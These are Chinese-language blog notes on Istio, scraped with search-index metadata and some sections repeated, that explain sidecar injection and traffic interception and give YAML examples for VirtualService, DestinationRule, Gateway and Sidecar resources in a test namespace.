当用户发起一个请求(通过namespace自动注入sidecar或者手工kube-inject注入sidecar) 3 流程执行 Pilot 监听 kube-apiserver 的请求变化。 发现k8s创建请求，并且发现namespace包含注入标签或者手工kube-inject注入sidecar istio通过CRD对象，经由kube-apiserver对pod进行属性修改，添加大量sidecar相关的属性信息 - 扩充istio-init、istio-proxy等容器属性 pod启动时候，kubelet 调用cri-服务创建容器服务 - 首先启动istio-init初始化应用容器，设定大量的proxy代理需要的防火墙规则 - 初始化容器使命结束后，结合大量启动参数，拉起istio-proxy容器(因为他们是同一个镜像) - istio-proxy容器内部的pilot-agent 进程从 Pilot中获取流量策略配置 - pilot-agent 把获取的配置转换成Envoy识别的规则，然后通过启动参数，拉起Envoy服务 - Envoy 作为sidecar，根据转换后的规则对pod内部的所有流量进行管控 - 启动应用服务容器，受sidecar的流量策略监管。 4 数据聚合 istio-proxy对多有的流量数据、日志数据、检测数据、遥测数据进行聚合 所有的内部应用容器的检测通过istio-proxy上的15020进行检测 pilot-agent与istio的pilot等组件实时同步相关信息 注意： 关于istio-proxy和应用容器的启动顺序由配置文件内部的顺序决定 但是应用容器的服务检测，必须通过istio-proxy检测后，才会向外表示正常 容器内部信息pod 内部存在 app 和 sidecar 两个容器 ifconfig 的 ip ，网卡完全一致。（初始化容器干的） 会出现很多监听的端口： 15000，15001，15006，15021，15090 都是被 envoy 进程所管理的 15004，15020 是被 pilot-agent 进程管理的 kubectl logs -f -n istio-test pod名称 -c istio-init PROXY_UID=1337, PROXY_GID=1337, 容器内输入 id 1337 ，可以看到所有流量被 istio-proxy 用户接管 uid=1337(istio-proxy) gid=1337(istio-proxy) groups=1337(istio-proxy) ISTIO_IN_REDIRECT 15006 监听所有流量进入 ISTIO_REDIRECT 15001 监听流出地址 istio 的端口，作用说明 Istio / Application Requirements ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:5:3","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#容器注入和启动"},{"categories":["blog"],"content":" 容器解读 容器注入和启动常见问题： sidecar 如何接入流量？初始化动作，实现容器网络和 sidecar 网络一致 访问 pod 的流量，怎么给 proxy？定制大量防火墙规则 流量接管的规则从哪来？istiod 的 pilot 分发 流程： 先部署 istiod（galley，pilot） 用户提交 yaml，被 pilot 监听到 使用 istio-init 初始化动作，配置防火墙 intio-proxy（sidecar）：拉取配置，处理流量。内部有 pilot-agent 和 envoy pilot-agent 和 istiod/polit 建立连接，拿到配置后转换成 envoy 配置。同时这个连接不会关闭，一旦出现变更 istiod/polit 可以主动推送变化 启动 envoy 课件版： 1 基本环境状况 istio构建于k8s集群之上，所有的请求都是基于k8s的apiserver组件来接收 2 接收请求 当用户发起一个请求(通过namespace自动注入sidecar或者手工kube-inject注入sidecar) 3 流程执行 Pilot 监听 kube-apiserver 的请求变化。 发现k8s创建请求，并且发现namespace包含注入标签或者手工kube-inject注入sidecar istio通过CRD对象，经由kube-apiserver对pod进行属性修改，添加大量sidecar相关的属性信息 - 扩充istio-init、istio-proxy等容器属性 pod启动时候，kubelet 调用cri-服务创建容器服务 - 首先启动istio-init初始化应用容器，设定大量的proxy代理需要的防火墙规则 - 初始化容器使命结束后，结合大量启动参数，拉起istio-proxy容器(因为他们是同一个镜像) - istio-proxy容器内部的pilot-agent 进程从 Pilot中获取流量策略配置 - pilot-agent 把获取的配置转换成Envoy识别的规则，然后通过启动参数，拉起Envoy服务 - Envoy 作为sidecar，根据转换后的规则对pod内部的所有流量进行管控 - 启动应用服务容器，受sidecar的流量策略监管。 4 数据聚合 istio-proxy对多有的流量数据、日志数据、检测数据、遥测数据进行聚合 所有的内部应用容器的检测通过istio-proxy上的15020进行检测 pilot-agent与istio的pilot等组件实时同步相关信息 注意： 关于istio-proxy和应用容器的启动顺序由配置文件内部的顺序决定 但是应用容器的服务检测，必须通过istio-proxy检测后，才会向外表示正常 容器内部信息pod 内部存在 app 和 sidecar 两个容器 ifconfig 的 ip ，网卡完全一致。（初始化容器干的） 会出现很多监听的端口： 15000，15001，15006，15021，15090 都是被 envoy 进程所管理的 15004，15020 是被 pilot-agent 进程管理的 kubectl logs -f -n istio-test pod名称 -c istio-init PROXY_UID=1337, PROXY_GID=1337, 容器内输入 id 1337 ，可以看到所有流量被 istio-proxy 用户接管 uid=1337(istio-proxy) gid=1337(istio-proxy) groups=1337(istio-proxy) ISTIO_IN_REDIRECT 15006 监听所有流量进入 ISTIO_REDIRECT 15001 监听流出地址 istio 的端口，作用说明 Istio / Application Requirements ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:5:3","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#容器内部信息"},{"categories":["blog"],"content":" istio 资源使用实践","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:0","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#istio-资源使用实践"},{"categories":["blog"],"content":" 测试客户端准备一个测试客户端，后面的 curl 都会在这里进行测试 apiVersion: apps/v1 kind: Deployment metadata: labels: app: client name: client namespace: istio-traffic-test spec: replicas: 1 selector: matchLabels: app: client template: metadata: labels: app: client spec: containers: - image: busybox:v0.1 name: client command: [\"/bin/sh\",\"-c\",\"sleep 72000\"] ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:1","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#测试客户端"},{"categories":["blog"],"content":" 基础使用创建 新的命名空间 istio-traffic-test http 运行容器 httpd1 和 httpd2 web-svc，httpd-1-svc 和 httpd-2-svc apiVersion: v1 kind: Namespace metadata: name: istio-traffic-test --- apiVersion: apps/v1 kind: Deployment metadata: labels: server: httpd1 app: web name: httpd1 namespace: istio-traffic-test spec: replicas: 1 selector: matchLabels: server: httpd1 app: web template: metadata: labels: server: httpd1 app: web spec: containers: - image: busybox:v0.1 name: httpd command: [\"/bin/sh\",\"-c\",\"echo 'HTTP Web Page-1' \u003e /var/www/index.html; httpd -f -p 8080 -h /var/www\"] --- apiVersion: apps/v1 kind: Deployment metadata: labels: server: httpd2 app: web name: httpd2 namespace: istio-traffic-test spec: replicas: 1 selector: matchLabels: server: httpd2 app: web template: metadata: labels: server: httpd2 app: web spec: containers: - image: busybox:v0.1 name: httpd command: [\"/bin/sh\",\"-c\",\"echo 'HTTP Web Page-2' \u003e /var/www/index.html; httpd -f -p 8080 -h /var/www\"] --- apiVersion: v1 kind: Service metadata: name: httpd-1-svc namespace: istio-traffic-test spec: selector: server: httpd1 ports: - name: http port: 8080 --- apiVersion: v1 kind: Service metadata: name: httpd-2-svc namespace: istio-traffic-test spec: selector: server: httpd2 ports: - name: http port: 8080 --- apiVersion: v1 kind: Service metadata: name: web-svc namespace: istio-traffic-test spec: selector: app: web ports: - name: http port: 8080 使用 VirtualService 真正转发流量，按照权重分配 apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: web-svc-vs namespace: istio-traffic-test spec: hosts: - web-svc http: - route: - destination: host: httpd-1-svc port: number: 8080 weight: 20 - destination: host: httpd-2-svc port: number: 8080 weight: 80 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:2","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#基础使用"},{"categories":["blog"],"content":" 资源对象之间的关系 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:3","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#资源对象之间的关系"},{"categories":["blog"],"content":" VirtualService 详解 VirtualService.spec apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: # 元数据部分，包括VirtualServer的名称 name: my-virtualserver namespace: default spec: # 定义VirtualServer的规则和配置 hosts: # 指定VirtualServer应用的主机名，可以是一个或多个 - example.com # 改地址必须能够被正常访问 gateways: # 指定VirtualServer关联的网关，可以是一个或多个 - my-gateway http: # 定义HTTP流量的路由规则 - match: # 指定匹配条件， - uri: # 支持使用URI前缀匹配 prefix: /path/to/url rewrite: # 定义HTTP流量的路由重写规则 uri: / route: # 定义匹配条件满足时的路由目标 - destination: # 指定路由的目标服务 host: api-service # 指定目标服务的主机名，可以是k8s的service对象 port: # 指定目标服务的端口号 number: 8080 基于 url 改写了 url 如果都不匹配，有一个默认路由 xxx-svc apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-rul namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - uri: prefix: /app1 rewrite: uri: / route: - destination: host: httpd-1-svc - match: - uri: prefix: /app2 rewrite: uri: / route: - destination: host: httpd-2-svc - route: - destination: host: xxx-svc 基于权重 apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-weight namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - port: 8080 route: - destination: host: httpd-1-svc weight: 10 - destination: host: httpd-2-svc weight: 90 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:4","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#virtualservice-详解"},{"categories":["blog"],"content":" VirtualService 详解 VirtualService.spec apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: # 元数据部分，包括VirtualServer的名称 name: my-virtualserver namespace: default spec: # 定义VirtualServer的规则和配置 hosts: # 指定VirtualServer应用的主机名，可以是一个或多个 - example.com # 改地址必须能够被正常访问 gateways: # 指定VirtualServer关联的网关，可以是一个或多个 - my-gateway http: # 定义HTTP流量的路由规则 - match: # 指定匹配条件， - uri: # 支持使用URI前缀匹配 prefix: /path/to/url rewrite: # 定义HTTP流量的路由重写规则 uri: / route: # 定义匹配条件满足时的路由目标 - destination: # 指定路由的目标服务 host: api-service # 指定目标服务的主机名，可以是k8s的service对象 port: # 指定目标服务的端口号 number: 8080 基于 url 改写了 url 如果都不匹配，有一个默认路由 xxx-svc apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-rul namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - uri: prefix: /app1 rewrite: uri: / route: - destination: host: httpd-1-svc - match: - uri: prefix: /app2 rewrite: uri: / route: - destination: host: httpd-2-svc - route: - destination: host: xxx-svc 基于权重 apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-weight namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - port: 8080 route: - destination: host: httpd-1-svc weight: 10 - destination: host: httpd-2-svc weight: 90 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:4","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#virtualservicespec"},{"categories":["blog"],"content":" VirtualService 详解 VirtualService.spec apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: # 元数据部分，包括VirtualServer的名称 name: my-virtualserver namespace: default spec: # 定义VirtualServer的规则和配置 hosts: # 指定VirtualServer应用的主机名，可以是一个或多个 - example.com # 改地址必须能够被正常访问 gateways: # 指定VirtualServer关联的网关，可以是一个或多个 - my-gateway http: # 定义HTTP流量的路由规则 - match: # 指定匹配条件， - uri: # 支持使用URI前缀匹配 prefix: /path/to/url rewrite: # 定义HTTP流量的路由重写规则 uri: / route: # 定义匹配条件满足时的路由目标 - destination: # 指定路由的目标服务 host: api-service # 指定目标服务的主机名，可以是k8s的service对象 port: # 指定目标服务的端口号 number: 8080 基于 url 改写了 url 如果都不匹配，有一个默认路由 xxx-svc apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-rul namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - uri: prefix: /app1 rewrite: uri: / route: - destination: host: httpd-1-svc - match: - uri: prefix: /app2 rewrite: uri: / route: - destination: host: httpd-2-svc - route: - destination: host: xxx-svc 基于权重 apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-weight namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - port: 8080 route: - destination: host: httpd-1-svc weight: 10 - destination: host: httpd-2-svc weight: 90 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:4","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#基于-url"},{"categories":["blog"],"content":" VirtualService 详解 VirtualService.spec apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: # 元数据部分，包括VirtualServer的名称 name: my-virtualserver namespace: default spec: # 定义VirtualServer的规则和配置 hosts: # 指定VirtualServer应用的主机名，可以是一个或多个 - example.com # 改地址必须能够被正常访问 gateways: # 指定VirtualServer关联的网关，可以是一个或多个 - my-gateway http: # 定义HTTP流量的路由规则 - match: # 指定匹配条件， - uri: # 支持使用URI前缀匹配 prefix: /path/to/url rewrite: # 定义HTTP流量的路由重写规则 uri: / route: # 定义匹配条件满足时的路由目标 - destination: # 指定路由的目标服务 host: api-service # 指定目标服务的主机名，可以是k8s的service对象 port: # 指定目标服务的端口号 number: 8080 基于 url 改写了 url 如果都不匹配，有一个默认路由 xxx-svc apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-rul namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - uri: prefix: /app1 rewrite: uri: / route: - destination: host: httpd-1-svc - match: - uri: prefix: /app2 rewrite: uri: / route: - destination: host: httpd-2-svc - route: - destination: host: xxx-svc 基于权重 apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-weight namespace: istio-traffic-test spec: hosts: - web-svc http: - match: - port: 8080 route: - destination: host: httpd-1-svc weight: 10 - destination: host: httpd-2-svc weight: 90 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:4","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#基于权重"},{"categories":["blog"],"content":" DestinationRule DestinationRule.spec 必须配合 VirtualService 发挥作用 subsets 有点像 service，通过标签拿到变成一个个 pod 集合。 一旦使用 subset 的时候，就相当于使用 subset 的角色来替换，VS 里面默认的 destination.host 属性，所以必须使用 subset 里的名称 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: # 元数据部分，包括 DestinationRule 的名称 name: \u003cdestinationrule-name\u003e spec: # 规范部分，定义 DestinationRule 的规则和配置 host: \u003cservice-host\u003e # 指定目标服务的主机名 trafficPolicy: # 流量策略配置部分 loadBalancer: # 负载均衡器配置 simple: \u003cload-balancer-configuration\u003e # 指定负载均衡策略，ROUND_ROBIN（轮询）策略。 # 主要是本地级别、轮询级别、http级别 connectionPool: # 连接池配置 http: # 指定 HTTP 连接池配置。 http1MaxPendingRequests: 100 # 每个连接允许的最大挂起请求数 maxRequestsPerConnection: 5 # 指定每个连接的最大请求数。 outlierDetection: # 异常检测配置 consecutiveErrors: 5 # 指定连续错误的阈值。 interval: 5s # 指定检测间隔时间。 baseEjectionTime: 30s # 指定从负载均衡中排除主机的基本时间。 maxEjectionPercent: 50 # 指定最大排除比例。 subsets: # 服务端点集合,用于路由规则中的流量拆分 - name: xxxx labels: # 使用标签对服务注册表中的服务端点进行筛选 version: v3 trafficPolicy: loadBalancer: simple: ROUND_ROBIN # 支持默认的轮询调度 consistentHash: # 支持基于http的相关属性调度。比如httpHeaderName等 httpCookie: name: user 简单示例 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: httpd1 labels: server: httpd1 - name: httpd2 labels: server: httpd2 --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-subset namespace: istio-traffic-test spec: hosts: - web-svc http: - route: - destination: host: web-svc subset: httpd1 weight: 70 - destination: host: web-svc subset: httpd2 weight: 30 基于 ip 的会话保持 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: http-web labels: app: web trafficPolicy: loadBalancer: consistentHash: useSourceIp: true ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:5","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#destinationrule"},{"categories":["blog"],"content":" DestinationRule DestinationRule.spec 必须配合 VirtualService 发挥作用 subsets 有点像 service，通过标签拿到变成一个个 pod 集合。 一旦使用 subset 的时候，就相当于使用 subset 的角色来替换，VS 里面默认的 destination.host 属性，所以必须使用 subset 里的名称 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: # 元数据部分，包括 DestinationRule 的名称 name: spec: # 规范部分，定义 DestinationRule 的规则和配置 host: # 指定目标服务的主机名 trafficPolicy: # 流量策略配置部分 loadBalancer: # 负载均衡器配置 simple: # 指定负载均衡策略，ROUND_ROBIN（轮询）策略。 # 主要是本地级别、轮询级别、http级别 connectionPool: # 连接池配置 http: # 指定 HTTP 连接池配置。 http1MaxPendingRequests: 100 # 每个连接允许的最大挂起请求数 maxRequestsPerConnection: 5 # 指定每个连接的最大请求数。 outlierDetection: # 异常检测配置 consecutiveErrors: 5 # 指定连续错误的阈值。 interval: 5s # 指定检测间隔时间。 baseEjectionTime: 30s # 指定从负载均衡中排除主机的基本时间。 maxEjectionPercent: 50 # 指定最大排除比例。 subsets: # 服务端点集合,用于路由规则中的流量拆分 - name: xxxx labels: # 使用标签对服务注册表中的服务端点进行筛选 version: v3 trafficPolicy: loadBalancer: simple: ROUND_ROBIN # 支持默认的轮询调度 consistentHash: # 支持基于http的相关属性调度。比如httpHeaderName等 httpCookie: name: user 简单示例 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: httpd1 labels: server: httpd1 - name: httpd2 labels: server: httpd2 --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-subset namespace: istio-traffic-test spec: hosts: - web-svc http: - route: - destination: host: web-svc subset: httpd1 weight: 70 - destination: host: web-svc subset: httpd2 weight: 30 基于 ip 的会话保持 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: http-web labels: app: web trafficPolicy: loadBalancer: consistentHash: useSourceIp: true ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:5","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#destinationrulespec"},{"categories":["blog"],"content":" DestinationRule DestinationRule.spec 必须配合 VirtualService 发挥作用 subsets 有点像 service，通过标签拿到变成一个个 pod 集合。 一旦使用 subset 的时候，就相当于使用 subset 的角色来替换，VS 里面默认的 destination.host 属性，所以必须使用 subset 里的名称 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: # 元数据部分，包括 DestinationRule 的名称 name: spec: # 规范部分，定义 DestinationRule 的规则和配置 host: # 指定目标服务的主机名 trafficPolicy: # 流量策略配置部分 loadBalancer: # 负载均衡器配置 simple: # 指定负载均衡策略，ROUND_ROBIN（轮询）策略。 # 主要是本地级别、轮询级别、http级别 connectionPool: # 连接池配置 http: # 指定 HTTP 连接池配置。 http1MaxPendingRequests: 100 # 每个连接允许的最大挂起请求数 maxRequestsPerConnection: 5 # 指定每个连接的最大请求数。 outlierDetection: # 异常检测配置 consecutiveErrors: 5 # 指定连续错误的阈值。 interval: 5s # 指定检测间隔时间。 baseEjectionTime: 30s # 指定从负载均衡中排除主机的基本时间。 maxEjectionPercent: 50 # 指定最大排除比例。 subsets: # 服务端点集合,用于路由规则中的流量拆分 - name: xxxx labels: # 使用标签对服务注册表中的服务端点进行筛选 version: v3 trafficPolicy: loadBalancer: simple: ROUND_ROBIN # 支持默认的轮询调度 consistentHash: # 支持基于http的相关属性调度。比如httpHeaderName等 httpCookie: name: user 简单示例 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: httpd1 labels: server: httpd1 - name: httpd2 labels: server: httpd2 --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-subset namespace: istio-traffic-test spec: hosts: - web-svc http: - route: - destination: host: web-svc subset: httpd1 weight: 70 - destination: host: web-svc subset: httpd2 weight: 30 基于 ip 的会话保持 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: http-web labels: app: web trafficPolicy: loadBalancer: consistentHash: useSourceIp: true ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:5","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#简单示例"},{"categories":["blog"],"content":" DestinationRule DestinationRule.spec 必须配合 VirtualService 发挥作用 subsets 有点像 service，通过标签拿到变成一个个 pod 集合。 一旦使用 subset 的时候，就相当于使用 subset 的角色来替换，VS 里面默认的 destination.host 属性，所以必须使用 subset 里的名称 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: # 元数据部分，包括 DestinationRule 的名称 name: spec: # 规范部分，定义 DestinationRule 的规则和配置 host: # 指定目标服务的主机名 trafficPolicy: # 流量策略配置部分 loadBalancer: # 负载均衡器配置 simple: # 指定负载均衡策略，ROUND_ROBIN（轮询）策略。 # 主要是本地级别、轮询级别、http级别 connectionPool: # 连接池配置 http: # 指定 HTTP 连接池配置。 http1MaxPendingRequests: 100 # 每个连接允许的最大挂起请求数 maxRequestsPerConnection: 5 # 指定每个连接的最大请求数。 outlierDetection: # 异常检测配置 consecutiveErrors: 5 # 指定连续错误的阈值。 interval: 5s # 指定检测间隔时间。 baseEjectionTime: 30s # 指定从负载均衡中排除主机的基本时间。 maxEjectionPercent: 50 # 指定最大排除比例。 subsets: # 服务端点集合,用于路由规则中的流量拆分 - name: xxxx labels: # 使用标签对服务注册表中的服务端点进行筛选 version: v3 trafficPolicy: loadBalancer: simple: ROUND_ROBIN # 支持默认的轮询调度 consistentHash: # 支持基于http的相关属性调度。比如httpHeaderName等 httpCookie: name: user 简单示例 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: httpd1 labels: server: httpd1 - name: httpd2 labels: server: httpd2 --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-subset namespace: istio-traffic-test spec: hosts: - web-svc http: - route: - destination: host: web-svc subset: httpd1 weight: 70 - destination: host: web-svc subset: httpd2 weight: 30 基于 ip 的会话保持 apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-rule-subset namespace: istio-traffic-test spec: host: web-svc subsets: - name: http-web labels: app: web trafficPolicy: loadBalancer: consistentHash: useSourceIp: true ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:5","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#基于-ip-的会话保持"},{"categories":["blog"],"content":" Gateway Gateway.spec apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: # 元数据部分，包括 Gateway 的名称 name: my-gateway spec: # 规范部分，定义 Gateway 的规则和配置。 selector: # 选择器用于选择要将流量路由到的 Istio Ingress Gateway istio: ingressgateway # 选择器标签用于匹配 Istio Ingress Gateway servers: # 定义 Gateway 监听的服务器配置 - port: # 指定服务器的端口配置 number: 80 # 指定服务器的端口号，这个是istioingressgateway暴露端口 name: http # 指定服务器的名称。 protocol: HTTP # 指定服务器的协议。 hosts: # 指定 Gateway 监听的主机名列表， - \"*\" # 这里使用通配符 \"*\" 匹配所有主机。 搭配使用 apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: traffic-route-gw namespace: istio-traffic-test spec: selector: istio: ingressgateway servers: - port: number: 80 name: http protocol: HTTP hosts: - \"*\" --- apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-route-subset namespace: istio-traffic-test spec: host: \"*\" subsets: - name: httpd-1-svc labels: server: httpd1 --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-vs namespace: istio-traffic-test spec: hosts: - \"*\" gateways: - traffic-route-gw http: - route: - destination: host: web-svc subset: httpd-1-svc 验证： # 可以看到vs引用的gateway和配置的hosts kubectl get vs # 访问测试 curl ingressgateway-clusterIP或者loadbalanceIP ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:6","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#gateway"},{"categories":["blog"],"content":" Gateway Gateway.spec apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: # 元数据部分，包括 Gateway 的名称 name: my-gateway spec: # 规范部分，定义 Gateway 的规则和配置。 selector: # 选择器用于选择要将流量路由到的 Istio Ingress Gateway istio: ingressgateway # 选择器标签用于匹配 Istio Ingress Gateway servers: # 定义 Gateway 监听的服务器配置 - port: # 指定服务器的端口配置 number: 80 # 指定服务器的端口号，这个是istioingressgateway暴露端口 name: http # 指定服务器的名称。 protocol: HTTP # 指定服务器的协议。 hosts: # 指定 Gateway 监听的主机名列表， - \"*\" # 这里使用通配符 \"*\" 匹配所有主机。 搭配使用 apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: traffic-route-gw namespace: istio-traffic-test spec: selector: istio: ingressgateway servers: - port: number: 80 name: http protocol: HTTP hosts: - \"*\" --- apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-route-subset namespace: istio-traffic-test spec: host: \"*\" subsets: - name: httpd-1-svc labels: server: httpd1 --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-vs namespace: istio-traffic-test spec: hosts: - \"*\" gateways: - traffic-route-gw http: - route: - destination: host: web-svc subset: httpd-1-svc 验证： # 可以看到vs引用的gateway和配置的hosts kubectl get vs # 访问测试 curl ingressgateway-clusterIP或者loadbalanceIP ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:6","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#gatewayspec"},{"categories":["blog"],"content":" Gateway Gateway.spec apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: # 元数据部分，包括 Gateway 的名称 name: my-gateway spec: # 规范部分，定义 Gateway 的规则和配置。 selector: # 选择器用于选择要将流量路由到的 Istio Ingress Gateway istio: ingressgateway # 选择器标签用于匹配 Istio Ingress Gateway servers: # 定义 Gateway 监听的服务器配置 - port: # 指定服务器的端口配置 number: 80 # 指定服务器的端口号，这个是istioingressgateway暴露端口 name: http # 指定服务器的名称。 protocol: HTTP # 指定服务器的协议。 hosts: # 指定 Gateway 监听的主机名列表， - \"*\" # 这里使用通配符 \"*\" 匹配所有主机。 搭配使用 apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: traffic-route-gw namespace: istio-traffic-test spec: selector: istio: ingressgateway servers: - port: number: 80 name: http protocol: HTTP hosts: - \"*\" --- apiVersion: networking.istio.io/v1beta1 kind: DestinationRule metadata: name: traffic-route-subset namespace: istio-traffic-test spec: host: \"*\" subsets: - name: httpd-1-svc labels: server: httpd1 --- apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: traffic-route-vs namespace: istio-traffic-test spec: hosts: - \"*\" gateways: - traffic-route-gw http: - route: - destination: host: web-svc subset: httpd-1-svc 验证： # 可以看到vs引用的gateway和配置的hosts kubectl get vs # 访问测试 curl ingressgateway-clusterIP或者loadbalanceIP ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:6","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#搭配使用"},{"categories":["blog"],"content":" Sidecar Sidecar.spec apiVersion: networking.istio.io/v1beta1 kind: Sidecar metadata: # 包含了 Sidecar 对象的名称和命名空间 name: my-sidecar namespace: my-namespace spec: # 定义了 Sidecar 对象的规范 workloadSelector: # 指定了与 Sidecar 关联的工作负载的标签选择器 labels: app: my-app outboundTrafficPolicy: # 定义了 Sidecar 的出站流量策略 mode: REGISTRY_ONLY # REGISTRY_ONLY，表示只允许与服务注册表中的服务进行通信 egress: # 定义了 Sidecar 的出口规则，即允许的外部主机和端口 - hosts: - example.com # 当前命名空间的 example.com的 service - \"./*\" # 当前命名空间下是所有Service - \"istio-system/*\" # 匹配istio-system命名空间下的所有Service ports: - port: 80 protocol: HTTP - port: 443 protocol: HTTPS - hosts: # 其他的访问交给istio-haha命名空间的服务 - \"istio-haha/*\" ingress: # 定义了 Sidecar 的入口规则，即允许的入站流量来源和目标 - from: - namespaceSelector: # 允许来自启用 Istio 注入的命名空间的流量 matchLabels: istio-injection: enabled port: # 将其转发到端口号为 8080 的 HTTP 目标 number: 8080 protocol: HTTP defaultEndpoint: my-service.default.svc.cluster.local # 默认端点 实践仅开放对当前命名空间下的 httpd-2-svc 的访问，而且对于其他应用禁止访问 apiVersion: networking.istio.io/v1beta1 kind: Sidecar metadata: name: sswang-sidecar namespace: \"istio-traffic-test\" spec: workloadSelector: labels: app: 